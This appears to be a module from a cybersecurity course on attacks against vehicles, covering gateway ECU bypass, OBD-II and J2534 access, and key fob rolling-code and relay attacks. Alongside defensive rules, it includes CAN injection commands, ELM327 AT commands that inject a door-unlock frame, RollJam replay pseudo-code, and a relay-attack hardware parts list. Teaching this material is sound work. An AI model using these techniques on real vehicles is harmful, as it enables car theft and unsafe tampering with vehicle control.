---
corso: "Cybersecurity Masterclass"
fase: "Domain 21 — Automotive Security: Vehicle-Level Attacks"
modulo: "21.B"
titolo: "Vehicle-Level Attacks, Sensor Security, and V2X"
versione: "UNR 155 / ISO 24089 / ISO SAE 21434 / Uptane (IEEE 2680-2022) / CCC Digital Key 4.0 / OCPP 2.0.1 / ISO 15118"
livello: "Advanced"
prerequisiti:
  - "Chapter 21A — In-vehicle networks (CAN, UDS, SOME/IP, SecOC, Automotive Ethernet)"
  - "Domain 9 — Network security (TLS, IP, DNS, ARP spoofing)"
  - "Domain 12 — Reverse engineering (firmware extraction, ARM/TriCore disassembly)"
  - "Domain 15 — Mobile security (cellular baseband, Android/iOS exploitation)"
  - "Domain 20 — RF security (SDR, replay attacks, BLE, GPS spoofing)"
obiettivi:
  - "Analyze gateway ECU routing tables for domain-isolation weaknesses and demonstrate gateway bypass via diagnostic-format message injection"
  - "Evaluate OBD-II dongle attack surface including Bluetooth, cellular, and J2534 pass-thru vectors with documented exploitation workflows"
  - "Assess key fob security against PKE relay, RollJam, and BLE relay attacks, and evaluate UWB distance-bounding as a countermeasure"
  - "Reconstruct remote vehicle attack kill chains (Jeep Cherokee, Tesla, BMW, Mercedes) mapping each stage to specific CWE and CVSS scores"
  - "Evaluate Uptane OTA framework security properties against rollback, freeze, mix-and-match, and partial-compromise attack classes"
tag: [automotive-attacks, gateway-bypass, obd-ii, key-fob, relay-attack, uwb, ota-security, uptane, adas-sensor, lidar-spoofing, v2x, ev-charging, iso-21434, unr-155]
---

# Domain 21, Chapter 21B — Vehicle-Level Attacks, Sensor Security, and V2X

> **Learning objectives.** After completing this module the student will be able to: (1) test gateway ECU domain isolation by injecting diagnostic-range CAN frames from non-diagnostic bus ports and documenting forwarding behavior; (2) demonstrate OBD-II dongle exploitation via unauthenticated Bluetooth connection to an ELM327 clone, injecting arbitrary CAN frames through AT commands; (3) analyze PKE relay attack hardware, calculate relay latency budgets, and compare with UWB IEEE 802.15.4z distance-bounding timing precision; (4) map the complete Jeep Cherokee and Tesla attack kill chains to specific CVEs, CWEs, and defense-in-depth failures at each stage; (5) verify Uptane OTA metadata verification chain integrity including Timestamp freshness, Snapshot consistency, Director/Image repository cross-validation, and version-monotonicity enforcement.

> **Scope.** Gateway ECU architecture and domain isolation (domain controller topology, zonal architecture, gateway bypass). OBD-II (J1962/J1979/J2534) in depth including aftermarket dongle attack surface. Key fob security (PKE relay, BLE relay, UWB distance bounding, RKE rolling codes, RollJam, KeeLoq analysis). Infotainment and telematics attack chains (QNX, Android Automotive, Linux-based IVI, TCU cellular exploitation). Remote attack case studies (Jeep Cherokee, Tesla, BMW ConnectedDrive, Mercedes MBUX, Hyundai/Kia USB bypass). OTA update security (Uptane framework deep dive, Director vs Image repository, time server protocol, delta updates). ADAS sensor attacks (LiDAR spoofing/blinding, camera saturation, adversarial patches, RADAR interference, ultrasonic spoofing, multi-sensor fusion attacks). V2X (DSRC 802.11p, C-V2X PC5, BSM format, SCMS PKI architecture, misbehavior detection, Sybil attacks). EV charging infrastructure (OCPP 1.6/2.0.1, ISO 15118 Plug & Charge, PLC attacks, rogue EVSE).

---

## 1. Gateway ECU architecture

### 1.1 Domain controller topology

The gateway ECU bridges multiple CAN buses and (increasingly) Automotive Ethernet segments. Its internal architecture: a multi-port CAN controller (one port per bus), an Ethernet switch (for Automotive Ethernet), a processor (typically Infineon TriCore or ARM Cortex-R) running the gateway firmware, and a routing table that defines which CAN IDs are forwarded between which buses and which Ethernet packets are routed between which VLANs.

In a traditional domain-based architecture, the vehicle's electronic systems are partitioned into five to six functional domains, each governed by a domain controller. The powertrain domain encompasses engine management, transmission control, and emission systems — it communicates on a high-speed CAN bus (500 kbps) because the tight timing requirements of engine control demand low latency. The chassis domain covers ABS, ESC, electric power steering, and active suspension — also high-speed CAN, often sharing the powertrain bus or running on a dedicated bus depending on the OEM. The body domain manages door locks, window lifts, lighting, HVAC, seat adjustment, and mirror control — typically on a lower-speed CAN bus (125 kbps) since these functions are less latency-sensitive. The ADAS domain aggregates sensor data (cameras, RADAR, LiDAR, ultrasonics) and runs perception, fusion, and path-planning algorithms — increasingly connected via Automotive Ethernet (100BASE-T1 or 1000BASE-T1) due to the high bandwidth demands of sensor data. The infotainment domain runs the IVI head unit, instrument cluster, rear-seat entertainment, and connectivity modules — connected via Automotive Ethernet to the gateway and via CAN to legacy components. A separate diagnostic or OBD bridge domain provides the diagnostic interface to the OBD-II port.

The gateway ECU sits at the intersection of all domain buses, enforcing routing policy between them. The routing table is the vehicle's internal firewall policy. A well-configured gateway forwards only necessary IDs between domains — the instrument cluster needs engine RPM from the powertrain bus, but the infotainment system does not need direct access to the ABS control messages. The gateway blocks diagnostic requests from non-diagnostic buses and rate-limits forwarded traffic. Each routing entry typically specifies: source bus, source arbitration ID (or range), destination bus, and optional transformation (remapping the ID, truncating the payload, or applying rate limiting). A strict gateway configuration uses a whitelist approach: only explicitly-permitted messages are forwarded; everything else is dropped silently.

### 1.2 Firewall rules between domains

The gateway's firewall rules follow a principle of least privilege applied to inter-domain communication. Powertrain-to-chassis: the transmission controller sends gear position to the ESC for traction control; engine torque signals flow to the steering ECU for electric power steering assist calibration. Powertrain-to-infotainment: engine RPM and vehicle speed are forwarded for dashboard display, but with read-only semantics — the infotainment domain should never originate a message on a powertrain arbitration ID. ADAS-to-chassis: ADAS sends braking and steering requests (for automated emergency braking and lane-keeping), but these messages should originate only from authenticated ADAS ECUs and should carry SecOC MACs (Chapter 21A §7). Infotainment-to-body: the IVI can send comfort commands (HVAC adjustment, ambient lighting), but should be blocked from sending door-unlock or ignition commands unless specifically allowed by a higher-level authentication mechanism.

Violations of these rules have been the root cause of multiple real-world exploits. The 2015 Jeep Cherokee attack succeeded in part because the gateway did not adequately filter diagnostic-format messages originating from the infotainment domain, allowing the compromised head unit to inject UDS commands that reached the powertrain and chassis buses. A properly-configured gateway would have blocked any frame with a diagnostic arbitration ID (0x7DF, 0x7E0–0x7E7) originating from the infotainment CAN port.

A gateway rule dump (conceptual, vendor-specific syntax varies) might look like:

```
# Gateway routing table — whitelist mode
# Format: src_bus, src_id, dst_bus, dst_id, rate_limit, direction

# Powertrain → Infotainment (read-only telemetry)
POWERTRAIN, 0x0C8, INFOTAINMENT, 0x0C8, 10ms, ONE_WAY   # Engine RPM
POWERTRAIN, 0x0D1, INFOTAINMENT, 0x0D1, 20ms, ONE_WAY   # Vehicle speed
POWERTRAIN, 0x1A4, INFOTAINMENT, 0x1A4, 100ms, ONE_WAY  # Coolant temp

# ADAS → Chassis (safety-critical, SecOC required)
ADAS, 0x2B0, CHASSIS, 0x2B0, 10ms, ONE_WAY, SECOC_REQUIRED  # AEB request
ADAS, 0x2B2, CHASSIS, 0x2B2, 10ms, ONE_WAY, SECOC_REQUIRED  # LKA torque

# Diagnostic port → All (restricted to diagnostic sessions only)
DIAG, 0x7DF, ALL, 0x7DF, RATE_50ms, ONE_WAY, DIAG_SESSION_ONLY
DIAG, 0x7E0-0x7E7, ALL, SAME, RATE_50ms, ONE_WAY, DIAG_SESSION_ONLY

# BLOCK: Infotainment → Powertrain (no path)
# BLOCK: Infotainment → Chassis (no path)
# BLOCK: Body → Powertrain (no path)
# DEFAULT: DROP all unmatched routes
```

### 1.3 Gateway bypass techniques

An attacker who has compromised an ECU within one domain seeks to cross domain boundaries. If the gateway's routing table is overly permissive (forwarding all IDs, or forwarding entire ID ranges rather than specific IDs), the attacker can inject messages that reach safety-critical buses. If the gateway firmware itself is compromised — via a firmware vulnerability, a diagnostic attack that reflashes it (using weak SecurityAccess authentication, as described in Chapter 21A §4.5), or a supply-chain implant at the OEM — the attacker bypasses all domain isolation entirely. They can inject frames on any bus, modify any forwarded message, and bridge traffic between previously-isolated domains.

Specific bypass techniques include exploiting routing table leaks, where the gateway inadvertently forwards certain ID ranges due to wildcard rules or misconfigured masks. In some implementations, the gateway passes through ISO-TP multi-frame messages (used for UDS diagnostic sessions) between all domains, enabling an attacker on the infotainment bus to establish a full UDS session with an ECU on the powertrain bus. This is exactly the technique Miller and Valasek used in the Jeep attack — they established a UDS session through the gateway with the Electronic Power Steering module, sent SecurityAccess requests, and ultimately reflashed its firmware.

Another approach is exploiting gateway update mechanisms: if the gateway accepts firmware updates via CAN (without cryptographic verification or with a broken SecureBoot chain), an attacker with CAN access can reflash the gateway firmware to remove all filtering rules. This was demonstrated in the 2016 Tesla attack by Keen Security Lab — the gateway accepted unsigned firmware images from the CID (Central Information Display), allowing the researchers to replace the gateway firmware entirely.

Testing for gateway bypass:

```bash
# From a device on the infotainment CAN bus, attempt to send
# a powertrain-range message and check if it appears on the powertrain bus
# (requires CAN interfaces on both buses — two SocketCAN adapters)

# Terminal 1: monitor powertrain bus for injected frame
candump -t a can_powertrain | grep "0C8"

# Terminal 2: inject frame on infotainment bus
cansend can_infotainment 0C8#DEADBEEFCAFEBABE

# If the frame appears on can_powertrain, the gateway forwards it — bypass confirmed
```

### 1.4 Zonal architecture (next-generation)

The automotive industry is transitioning from domain-based to zonal architecture. Instead of organizing ECUs by function (powertrain, chassis, body), zonal architecture organizes by physical location in the vehicle. Each zone (front-left, front-right, rear-left, rear-right, central) is managed by a high-performance zone controller (typically ARM Cortex-A or RISC-V with hardware security extensions). Zone controllers aggregate sensor inputs and actuator outputs within their physical zone and communicate with a central vehicle computer (or a small number of high-performance compute nodes) over high-bandwidth Automotive Ethernet (1000BASE-T1 or 10GBASE-T1).

Zonal architecture reduces wiring harness complexity and weight (a major cost driver — the wiring harness is often the third-heaviest component in a vehicle), but it also consolidates the attack surface. A zone controller that handles both body electronics (door locks) and ADAS sensor inputs (camera feeds) within its physical zone must enforce strict internal isolation — a compromise of the body-electronics processing pipeline must not grant access to ADAS data or control. The zone controller's internal security depends on hardware isolation (ARM TrustZone partitioning the secure world from the normal world, hardware MMU/MPU enforcing memory boundaries, or a separate HSM core for key storage and cryptographic operations) and software partitioning (hypervisor-based separation using Type-1 hypervisors such as QNX Hypervisor or ETAS RTA-HVR, or AUTOSAR Adaptive Platform's process isolation with POSIX-based sandboxing).

### 1.5 Gateway defense: hardening and anomaly detection

Defense measures for gateway ECUs include: Secure Boot (verifying firmware integrity at power-on using a hardware root of trust — the HSM stores the boot key and validates each boot stage before executing it), code-signing for firmware updates (only OEM-signed images are accepted — the gateway verifies RSA or ECDSA signatures against an embedded public key before flashing), SecOC on CAN messages the gateway processes (Chapter 21A §7), and hardware security modules (HSMs such as Infineon SHE, EVITA-Full compliant modules, or NXP S32G security subsystem) integrated into the gateway for cryptographic operations and key storage.

Anomaly detection at the gateway level monitors forwarded traffic for deviations from the expected communication matrix. The gateway knows which IDs should appear on which buses, at what frequency, and within what data ranges. A sudden appearance of a powertrain ID on the infotainment bus, or a message frequency that deviates from the expected 10 ms period by more than a configurable threshold, triggers an alert. Some gateway implementations support fail-safe modes: upon detecting anomalous traffic, the gateway can restrict forwarding to a minimal safe set (allowing only braking and steering messages, blocking infotainment-originated traffic entirely). This is analogous to a network firewall's fail-closed posture.

Specific anomaly signatures that a gateway IDS should detect:

```
# Gateway IDS detection rules (conceptual)

RULE 001: UNEXPECTED_SOURCE
  Trigger: Frame with ID in POWERTRAIN_RANGE received on INFOTAINMENT port
  Action:  DROP, LOG, increment anomaly counter
  Rationale: Infotainment ECUs never legitimately originate powertrain IDs

RULE 002: FREQUENCY_DEVIATION
  Trigger: Frame ID 0x0C8 arrives at interval < 5ms or > 50ms
           (expected: 10ms ± 1ms)
  Action:  LOG, alert if deviation persists > 100ms
  Rationale: Injection attacks often produce irregular timing

RULE 003: DIAGNOSTIC_FROM_NON_DIAG
  Trigger: Frame ID 0x7DF or 0x7E0-0x7E7 received on non-DIAG port
  Action:  DROP unconditionally, LOG with source port ID
  Rationale: Diagnostic requests must originate only from the OBD-II port

RULE 004: BUS_LOAD_SPIKE
  Trigger: Bus utilization exceeds 70% for > 500ms
           (normal: 30-40% on powertrain bus)
  Action:  Rate-limit lowest-priority IDs, LOG
  Rationale: Priority DoS attacks flood with ID 0x000

RULE 005: SECOC_MAC_FAILURE
  Trigger: SecOC verification fails on a safety-critical message
  Action:  DROP message, LOG with full frame contents, alert
  Rationale: MAC failure indicates tampering or replay
```

For vehicles with Automotive Ethernet alongside CAN, the gateway must also enforce Ethernet-layer security. VLAN isolation between domains (infotainment VLAN 10, ADAS VLAN 20, diagnostic VLAN 30) prevents cross-domain Ethernet traffic. MACsec (IEEE 802.1AE) provides link-layer encryption and integrity on Automotive Ethernet segments, preventing an attacker who gains physical access to an Ethernet link from sniffing or injecting traffic. Automotive Ethernet firewalls (implemented in the gateway's Ethernet switch ASIC or in software on the gateway processor) filter by source/destination MAC, VLAN, IP, and port — applying the same whitelist-only approach used for CAN arbitration IDs.

---

## 2. OBD-II in depth

### 2.1 J1962 connector pinout

The **J1962 connector** is a standardized 16-pin trapezoidal diagnostic link connector (DLC). The pin assignments span multiple automotive protocols:

```
J1962 DLC Pinout:
Pin  1: Manufacturer-discretionary
Pin  2: J1850 PWM Bus+ (Ford)
Pin  3: Manufacturer-discretionary (often MS-CAN High)
Pin  4: Chassis ground
Pin  5: Signal ground
Pin  6: CAN High (ISO 15765 — high-speed CAN, mandatory post-2008)
Pin  7: K-Line (ISO 9141-2 / ISO 14230 — legacy)
Pin  8: Manufacturer-discretionary
Pin  9: Manufacturer-discretionary
Pin 10: J1850 PWM Bus- (Ford)
Pin 11: Manufacturer-discretionary (often MS-CAN Low, or second CAN bus)
Pin 12: Manufacturer-discretionary
Pin 13: Manufacturer-discretionary
Pin 14: CAN Low (ISO 15765 — paired with pin 6)
Pin 15: L-Line (ISO 9141-2 — legacy initialization)
Pin 16: Battery positive (+12V unswitched — always powered)
```

The OBD-II port is typically located under the dashboard on the driver's side, within reach of the driver's knees, accessible without tools in most vehicles. Pin 16 provides unswitched battery power — the port is live even when the vehicle ignition is off. This means a device left plugged in continuously draws power and has continuous CAN bus access. Physical access to the OBD-II port gives direct access to at least the diagnostic CAN bus, and in many vehicles (especially those with a gateway that bridges diagnostic CAN to other buses), it provides indirect access to powertrain, chassis, and body CAN buses.

### 2.2 J1979 PID requests

OBD-II PIDs (Parameter IDs) defined by SAE J1979 provide standardized access to emission-related data and vehicle information. The diagnostic tester sends a request frame on the diagnostic CAN ID (0x7DF for a functional broadcast request that all ECUs respond to, or 0x7E0–0x7E7 for physical addressing of a specific ECU). ECUs respond on 0x7E8–0x7EF.

**Mode 0x01 (Show Current Data):** Returns real-time sensor values. Using SocketCAN and `isotpsend`:

```bash
# Query supported PIDs (Mode 01, PID 00) — broadcast to all ECUs
isotpsend -s 7DF -d 7E8 can0 <<< "01 00"
# Response: 41 00 BE 3E B8 11  (bitmask of supported PIDs 01-20)

# Query engine RPM (Mode 01, PID 0C)
isotpsend -s 7DF -d 7E8 can0 <<< "01 0C"
# Response: 41 0C 1A F8  → RPM = (0x1A * 256 + 0xF8) / 4 = 1726 RPM

# Query vehicle speed (Mode 01, PID 0D)
isotpsend -s 7DF -d 7E8 can0 <<< "01 0D"
# Response: 41 0D 3C  → Speed = 0x3C = 60 km/h

# Query coolant temperature (Mode 01, PID 05)
isotpsend -s 7DF -d 7E8 can0 <<< "01 05"
# Response: 41 05 6E  → Temp = 0x6E - 40 = 70°C
```

Key Mode 01 PIDs: 0x04 (calculated engine load, 0–100%), 0x05 (coolant temp, -40 to 215°C), 0x0C (engine RPM, 0–16383.75 RPM as 16-bit value / 4), 0x0D (vehicle speed, 0–255 km/h), 0x0F (intake air temperature), 0x11 (throttle position), 0x1F (run time since engine start). The set of supported PIDs varies by vehicle — the tester queries PID 0x00 first, then iterates through the supported PIDs using the bitmask response.

**Mode 0x02 (Show Freeze Frame Data):** Returns the sensor values captured at the time a Diagnostic Trouble Code (DTC) was set. The freeze frame preserves the vehicle state at the moment of failure, aiding diagnosis. The request includes a frame number identifying which freeze frame to read.

**Mode 0x03 (Show Stored DTCs):** Returns the list of emission-related DTCs currently stored in the ECU. DTCs follow the format: first character (P = powertrain, C = chassis, B = body, U = network), second character (0 = SAE standard, 1 = manufacturer-specific), followed by three digits. Example: P0300 = random/multiple cylinder misfire detected. P0171 = system too lean (Bank 1). P0420 = catalyst system efficiency below threshold. A Mode 03 request returns up to three DTCs per response frame.

**Mode 0x09 (Request Vehicle Information):** PID 0x02 returns the Vehicle Identification Number (VIN, 17 characters, delivered as a multi-frame ISO-TP response). PID 0x04 returns the calibration ID (firmware version identifier for the ECU). PID 0x0A returns the ECU name. The VIN is particularly sensitive: it uniquely identifies the vehicle and can be used for social engineering, warranty fraud, insurance fraud, or correlating a vehicle with its owner through public VIN databases.

Standard OBD-II PIDs are read-only. Write access to ECU parameters requires manufacturer-specific UDS commands (Chapter 21A §4) that are not accessible through standard OBD-II scan tools. However, the diagnostic CAN bus carries UDS traffic on the same physical bus, and an attacker with CAN bus access via the OBD-II port can send arbitrary UDS requests including SecurityAccess challenges and firmware download commands.

### 2.3 J2534 Pass-Thru programming

SAE J2534 defines a standardized API for PC-to-vehicle communication, enabling third-party (non-OEM) tools to reprogram ECUs. This was mandated by the EPA (in the US) and the European Commission (Euro 5/6) to ensure independent repair shops can perform ECU reprogramming without requiring OEM-specific proprietary tools.

A J2534-compliant device consists of hardware (a USB-to-CAN/Ethernet adapter) and software (a DLL implementing the J2534 API on Windows). The core API functions:

```c
// J2534 API — typical usage for ECU communication
PASSTHRU_MSG msg;
unsigned long numMsgs;
unsigned long channelID;

// Open device and connect ISO 15765 (CAN with ISO-TP) channel
PassThruOpen(NULL, &deviceID);
PassThruConnect(deviceID, ISO15765, 0, 500000, &channelID);  // 500 kbps CAN

// Set flow-control filter (required for ISO-TP multi-frame)
PassThruStartMsgFilter(channelID, FLOW_CONTROL_FILTER,
    &maskMsg, &patternMsg, &flowControlMsg, &filterID);

// Send UDS DiagnosticSessionControl — Extended Session
msg.Data = {0x00,0x00,0x07,0xDF, 0x10,0x03};  // 7DF = broadcast, 10 03 = ExtDiag
msg.DataSize = 6;
PassThruWriteMsgs(channelID, &msg, &numMsgs, 1000);

// Read response
PassThruReadMsgs(channelID, &respMsg, &numMsgs, 1000);

// Send TesterPresent keepalive every 2 seconds
msg.Data = {0x00,0x00,0x07,0xDF, 0x3E,0x00};  // 3E 00 = TesterPresent
PassThruStartPeriodicMsg(channelID, &msg, &periodicID, 2000);
```

The security implications of J2534 are significant. The API provides low-level, protocol-agnostic access to the vehicle bus. An OEM's reprogramming procedure typically requires SecurityAccess authentication (UDS service 0x27) before accepting a firmware download (UDS services 0x34 RequestDownload, 0x36 TransferData, 0x37 RequestTransferExit). But if the SecurityAccess algorithm is weak or has been reverse-engineered (Chapter 21A §4.5), J2534 provides the tooling for unauthorized ECU reprogramming — the attacker can script the entire reflash procedure through the J2534 API, automating SecurityAccess challenge-response, memory address selection, and firmware block transfer. Several open-source tools (such as the Toad/Forscan/PCMFlash communities) use J2534 interfaces with reverse-engineered SecurityAccess algorithms for ECU tuning and modification.

### 2.4 OBD-II dongles as attack surface

Aftermarket OBD-II dongles — fleet tracking devices, insurance telematics recorders (pay-how-you-drive/UBI), performance tuning tools, and consumer diagnostic readers — are plugged into the J1962 connector and left connected permanently. These devices combine CAN bus access with a wireless interface (Bluetooth Classic, BLE, Wi-Fi, or cellular). They represent a remote-to-CAN bridge: compromise the dongle's wireless interface, and you have CAN bus access.

ELM327-based dongles are the most common consumer OBD-II readers. The ELM327 is an AT-command-based CAN-to-serial interpreter. Chinese clones (which constitute the vast majority of sub-$20 OBD-II Bluetooth dongles on the market) often implement only a subset of the ELM327 command set and frequently have no authentication on their Bluetooth interface. The Bluetooth pairing is either completely open (no PIN), uses a default PIN (0000 or 1234), or uses SSP (Secure Simple Pairing) with Just Works mode (no user confirmation). An attacker within Bluetooth range (~10 m for Class 2) can connect to the dongle and issue AT commands:

```
# Connect to ELM327 Bluetooth dongle (rfcomm on Linux)
rfcomm connect hci0 AA:BB:CC:DD:EE:FF 1
# Opens /dev/rfcomm0 serial port

# Initialize and set protocol to CAN 500kbps
ATZ           # Reset
ATE0          # Echo off
ATL0          # Linefeeds off
ATSP6         # Set protocol: ISO 15765-4 CAN (500 kbps, 11-bit)

# Set custom CAN header (arbitrary arbitration ID)
ATSH 7E0      # Set header to physical address for ECU #1

# Send raw UDS request — DiagnosticSessionControl Extended
10 03
# Response: 50 03 xx xx (positive) or 7F 10 xx (negative)

# Set header to body-domain ID and inject door-unlock command
ATSH 2A0      # Hypothetical body-control arbitration ID
00 01         # Hypothetical unlock payload

# Any CAN frame, any arbitration ID — the dongle performs no filtering
```

This turns a $15 Bluetooth dongle into a remote CAN injection tool.

In 2017, Argus Cyber Security disclosed vulnerabilities in the Bosch Drivelog Connect OBD-II dongle. The dongle paired via Bluetooth without proper authentication, exposing a serial interface through which an attacker could inject arbitrary CAN messages. The dongle performed no filtering or validation of CAN messages sent through its interface — any arbitration ID, any payload. Since the dongle was physically connected to the diagnostic CAN bus (and the vehicles' gateways typically forward diagnostic-format messages), the attacker could reach powertrain and chassis ECUs. Bosch issued a firmware update adding Bluetooth authentication and CAN message filtering.

Cellular-connected OBD-II dongles (used by fleet management companies and usage-based insurance providers) expand the attack surface to the internet. The Argus/Zubie incident (2015) demonstrated that a compromised fleet-tracking dongle with a cellular modem could be remotely instructed to inject CAN messages. The attack chain: internet → cellular modem → dongle firmware → CAN bus → vehicle ECUs.

Defense against OBD-II dongle threats operates at multiple layers:

**Physical controls.** OBD-II port locks are physical devices that cover or block the J1962 connector, preventing unauthorized plugging or unplugging. Commercial products (e.g., OBD Saver, Port-Lock) require a proprietary key or tool for removal. Fleet operators should audit all OBD-II port devices during routine vehicle inspections.

**Gateway filtering.** The gateway ECU should enforce strict rules for traffic originating from the diagnostic CAN port. Non-diagnostic arbitration IDs should be dropped (the OBD-II port should only carry diagnostic-range IDs: 0x7DF-0x7EF for standard OBD, and the OEM-specific diagnostic ranges). UDS services that enable ECU programming (0x27 SecurityAccess, 0x34 RequestDownload, 0x36 TransferData) should be blocked from the OBD-II port unless a higher-level authentication has been completed (e.g., the service technician has authenticated via a secure challenge from the OEM's diagnostic cloud).

**Network segmentation.** The diagnostic CAN bus should be isolated from safety-critical buses (powertrain, chassis, ADAS). The gateway should provide only read-access to non-diagnostic data (forwarding responses to Mode 01/02/03/09 requests but blocking any write-type UDS services from crossing domain boundaries).

**Session-gated OBD-II access.** Advanced implementations disable OBD-II port forwarding entirely unless a valid diagnostic session is established through a multi-factor authentication process: the diagnostic tool authenticates to the OEM's cloud backend, receives a time-limited session token, and presents this token to the gateway via a secure UDS extension. Only after token verification does the gateway enable forwarding from the OBD-II port to other domain buses. This approach, adopted by several European OEMs since 2022, prevents drive-by OBD-II attacks while preserving legitimate diagnostic access.

---

## 3. Key fob security

### 3.1 RKE (Remote Keyless Entry) and rolling codes

Traditional RKE operates as a one-way UHF radio link: the key fob transmits a signal at 315 MHz (North America) or 433.92 MHz (Europe/Asia) containing an encrypted or HMAC'd rolling code. The receiver in the vehicle's body control module (BCM) verifies the code against its expected sequence and, if valid, triggers the lock/unlock actuators.

Rolling-code security depends entirely on the cipher used to generate the code sequence. **KeeLoq** (Microchip Technology) is the most widely deployed rolling-code cipher in automotive RKE. It uses a 64-bit nonlinear feedback shift register (NLFSR) with a 64-bit key to generate a pseudo-random sequence of 32-bit hopping codes. The cipher was designed for hardware efficiency (implementable in a few hundred gates), not cryptographic strength. Academic attacks have substantially weakened KeeLoq: Bogdanov (2007, Crypto) published an algebraic attack reducing the key space to 2^52 operations. Eisenbarth et al. (2008, Crypto) demonstrated a side-channel (power analysis) attack against the KeeLoq decryption running in the vehicle's receiver IC, recovering the manufacturer key — a single 64-bit key shared across an entire vehicle model line — from which individual device keys are derived. Indesteege et al. (2008, Eurocrypt) combined slide attacks with algebraic techniques to recover the key in 2^44.5 KeeLoq encryptions. With the manufacturer key, the attacker can clone any key fob for that model by observing just two consecutive rolling codes from the target fob.

**AUT64** (used in some European vehicles) and **HITAG2** (NXP, used in immobilizer transponders and some RKE systems) have also been cryptanalyzed. Verdult et al. (2012, 2015, USENIX Security) published practical attacks against HITAG2 and the Megamos Crypto transponder used in VW Group immobilizers — the HITAG2 48-bit key can be recovered from approximately four authentication traces in under one minute of computation on commodity hardware.

**RollJam attack.** Devised by Samy Kamkar and demonstrated at DEF CON 23 (2015). The hardware: two SDR radios (Yard Stick One, IM-Me, or HackRF One) and a microcontroller. The device operates as follows: (1) When the vehicle owner presses the key fob, the device jams the 315/433 MHz band (transmitting noise on the target frequency with one radio to prevent the vehicle receiver from hearing the legitimate signal) and simultaneously records the fob's transmission (rolling code N) on the second radio tuned to a slightly offset frequency. (2) The owner, seeing no response from the vehicle, presses the fob again. The device records the second transmission (rolling code N+1), stops jamming, and replays code N. The vehicle accepts code N and synchronizes its counter to N+1. (3) The attacker now holds valid unused code N+1 and can replay it at any later time to unlock the vehicle.

Example flow using Sub-GHz tools:

```
# RollJam conceptual flow (Yard Stick One / rfcat)

# Radio 1: Jam the 315 MHz band (continuous carrier)
# Radio 2: Receive on 315 MHz with narrow filter

# Step 1: Owner presses fob → Radio 2 captures code N
#          Radio 1 jams → vehicle does not receive code N
captured_code_N = radio2.receive(freq=315000000, modulation=ASK_OOK)

# Step 2: Owner presses fob again → Radio 2 captures code N+1
#          Stop jamming, replay code N
captured_code_N1 = radio2.receive(freq=315000000, modulation=ASK_OOK)
radio1.stop_jamming()
radio2.transmit(captured_code_N)  # Vehicle accepts N, syncs to N+1

# Step 3: Attacker holds code N+1 — valid, unused
# Replay at attacker's convenience:
radio2.transmit(captured_code_N1)  # Vehicle accepts N+1, unlocks
```

The Flipper Zero (a consumer sub-GHz transceiver capable of 300-928 MHz) can capture and replay rolling codes using its Sub-GHz app, though the jamming step requires an additional transmitter or careful frequency-offset technique. The Flipper's built-in rolling-code analysis can decode KeeLoq, CAME, Nice FLO, and other common protocols.

### 3.2 PKE (Passive Keyless Entry) relay attacks

PKE systems do not require the user to press a button — proximity is sufficient. The vehicle continuously broadcasts a low-frequency (125 kHz, sometimes 134.2 kHz) challenge signal. If the key fob is within range (typically 1–2 meters), it wakes up, processes the challenge cryptographically, and responds via UHF (315/433 MHz). The vehicle verifies the response and unlocks the doors. When the driver enters and presses the start button, a similar challenge-response authenticates the fob for engine start.

The relay attack exploits the fact that the PKE system verifies identity (cryptographic challenge-response) but does not verify proximity (it assumes that a valid response means the fob is nearby). The relay equipment consists of two devices. The **near-vehicle relay** (positioned near the vehicle's door handle, within range of the 125 kHz transmitter) captures the LF challenge signal and modulates it onto a long-range carrier (2.4 GHz Wi-Fi, Bluetooth, or a custom analog VHF/UHF link). This modulated signal is transmitted to the **near-fob relay**, which may be tens or hundreds of meters away. The near-fob relay demodulates the signal and retransmits it as a 125 kHz emission near the key fob (which may be inside the owner's house). The fob responds via UHF. The vehicle receives a valid cryptographic response and unlocks.

The hardware for a PKE relay attack requires the following components:

```
PKE Relay Attack — Hardware Bill of Materials:

Near-Vehicle Relay (positioned within 2m of vehicle door handle):
  - 125 kHz LF receiver: ferrite antenna coil + LF amplifier
    (or Proxmark3 RDV4 with LF antenna — captures LF challenge)
  - Uplink transmitter: 2.4 GHz radio module (nRF24L01+ or ESP32)
    or analog FM transmitter (VHF/UHF link for lower latency)
  - Microcontroller: STM32 or Arduino for signal coordination
  - Power: 9V battery or USB powerbank
  - Total cost: ~$50-80 (DIY) or ~$100 (Proxmark-based)

Near-Fob Relay (positioned near the key fob — e.g., outside owner's house):
  - Downlink receiver: 2.4 GHz radio module (paired with uplink)
  - 125 kHz LF emitter: coil driver circuit reproducing the
    captured LF challenge at 125 kHz within 1-2m of the fob
  - Microcontroller: STM32 or Arduino
  - Power: 9V battery
  - Total cost: ~$30-50

Communication link between relays:
  - Option A: 2.4 GHz direct (range ~100m line-of-sight)
  - Option B: Bluetooth Classic (range ~30m)
  - Option C: Wi-Fi/cellular backhaul (unlimited range, higher latency)

Total attack cost: $80-150 for DIY, <$200 for turnkey underground kits
Relay latency: 1-10 microseconds (electronic), 1-5 ms (over IP)
PKE system timeout: typically 10-30 ms → relay succeeds easily
```

The ADAC demonstrated in 2016 that 24 out of 24 tested vehicles with PKE systems were vulnerable to relay attacks, with relay distances of up to 100 meters achieved using simple equipment. The relay adds latency — microseconds to low milliseconds — but PKE timeout windows are typically 10-30 milliseconds, far above the relay delay. The attack succeeds within seconds and leaves no forensic evidence on the vehicle (no damaged locks, no alarm trigger, no log entries on most vehicles).

### 3.3 BLE-based passive entry attacks

Several automakers have implemented BLE-based passive entry, most notably Tesla (Model 3, Model Y, and later Model S/X). BLE passive entry measures signal strength (RSSI) to estimate proximity, but RSSI is not a secure distance metric — it is trivially influenced by amplification, absorption, and multipath.

A BLE relay attack was demonstrated by NCC Group in 2022 (researcher Sultan Qasim Khan). Using two Bluetooth relay devices (based on Broadcom development boards), the attack relayed the BLE connection between a Tesla Model 3 and the owner's iPhone over arbitrary distance. The relay added approximately 8 ms of latency — well within the Tesla's BLE authentication timeout of ~30 ms. The attack required no modification to the vehicle or the phone. Because BLE connections can be relayed over the internet (using a Wi-Fi or cellular backhaul between the two relay nodes), the attack range is effectively unlimited.

Tesla's mitigations include: PIN-to-Drive (a secondary 4-digit PIN entered on the touchscreen before the vehicle will shift into drive — user-configured, not enabled by default), and UWB-based ranging on newer hardware (Model 3 Highland, 2024+ Model S/X with UWB phone key support).

### 3.4 UWB distance bounding

